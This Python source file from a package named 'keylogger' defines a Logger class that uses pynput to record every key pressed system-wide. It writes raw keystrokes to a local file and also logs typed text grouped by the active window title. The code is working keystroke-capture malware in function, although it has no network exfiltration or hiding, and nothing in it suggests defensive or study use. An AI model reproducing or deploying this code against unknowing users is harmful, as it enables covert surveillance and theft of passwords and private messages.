import os
import logging
from pynput import keyboard

if __package__ is None:
    # If this file is run directly, import from current directory
    from config import LOGS_DIR, LOGS_FILE, KEYSTROKES_FILE, DEBUG
    from utils import get_window_title
else:
    # If this file is imported as a module, use package imports
    from keylogger.config import LOGS_DIR, LOGS_FILE, KEYSTROKES_FILE, DEBUG
    from keylogger.utils import get_window_title


class Logger:
    def __init__(self) -> None:
        # Ensure the logs directory exists
        os.makedirs(LOGS_DIR, exist_ok=True)

        self.keystrokes_file = open(
            os.path.join(LOGS_DIR, KEYSTROKES_FILE), "a", encoding="utf-8"
        )

        logging.basicConfig(
            filename=os.path.join(LOGS_DIR, LOGS_FILE),
            level=logging.INFO,
            format="%(levelname)s: %(asctime)s - %(message)s",
            datefmt="%m/%d/%Y %H:%M:%S",
            encoding="utf-8"
        )

        self.buffer = ""
        self.last_window = ""

    def start(self) -> None:
        """
        Starts a keyboard listener and writes logs into a file defined in config.py.
        The listener runs until manually stopped.
        """
        self.last_window = get_window_title()
        logging.warning("===> Listener has started <===")

        with keyboard.Listener(
            on_press=self.on_press, on_release=self.on_release
        ) as listener:
            listener.join()

        self.keystrokes_file.close()
        logging.warning("===> Listener has stopped <===")

    def write2file_detailed(self, action: str) -> None:
        """
        Logs buffered text grouped by window title. Called when window focus changes.

        Example: The user types "hello world" in Chrome, then switches to VS Code.
        This function logs the "hello world" with Chrome's title.
        """
        logging.info(f"[{self.last_window}] | Typed: {action}")
        self.last_window = self.current_window
        self.buffer = ""

    def write2file(self, action: str) -> None:
        """Writes the action (keystroke) directly to file."""
        self.keystrokes_file.write(action)
        self.keystrokes_file.flush()

    def on_press(self, key) -> None:
        self.current_window = get_window_title() or "Unknown Window"

        try:
            key_str = str(key.char)
        except AttributeError:
            key_str = f"[{str(key).replace('Key.', '').upper()}]"

        self.write2file(key_str)

        if self.current_window == self.last_window:
            self.buffer += key_str
        else:
            self.write2file_detailed(self.buffer)
            self.buffer += key_str

    def on_release(self, key) -> bool | None:
        print(f"{key} released")
        if DEBUG and key == keyboard.Key.esc:
            logging.warning("===> Listener has been stopped by user <===")
            return False  # Stop listener


if __name__ == "__main__":
    app = Logger()
    app.start()
